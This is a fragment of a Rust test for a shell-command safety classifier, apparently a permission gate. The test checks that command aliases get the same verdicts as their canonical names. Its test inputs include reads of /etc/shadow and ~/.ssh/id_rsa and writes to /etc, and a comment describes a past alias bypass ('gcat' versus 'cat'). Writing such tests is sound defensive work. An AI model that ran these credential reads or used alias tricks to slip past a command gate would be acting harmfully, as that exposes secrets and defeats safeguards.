            assert!(crate::is_safe_command(c), "benign worktree write must allow: {c}");
        }
    }

    /// An alias is a pure synonym: it MUST classify identically to its canonical name for every
    /// input. A divergence is a bypass — the Homebrew g-alias path-gate hole was exactly this
    /// (`gcat /etc/shadow` allowed while `cat /etc/shadow` denied).
    #[test]
    fn every_alias_matches_its_canonical_verdict() {
        const TAILS: &[&str] = &[
            "", "/etc/shadow", "~/.ssh/id_rsa", "--output /etc/x", "-o /etc/evil",
            "--outfile /etc/evil in", "./local.txt", "--help", "x > /etc/evil",
        ];
        let mut failures = Vec::new();
        for (key, spec) in super::TOML_REGISTRY.iter() {
            if key == &spec.name {
                continue;
            }
            for tail in TAILS {
                let av = crate::command_verdict(&format!("{key} {tail}"));
                let cv = crate::command_verdict(&format!("{} {tail}", spec.name));
                if av != cv {
                    failures.push(format!("  {key} vs {}: `{tail}` -> {av:?} != {cv:?}", spec.name));
                }
            }
        }
        assert!(
            failures.is_empty(),
            "alias/canonical verdict divergence (an alias must classify identically):\n{}",
            failures.join("\n")
        );
    }
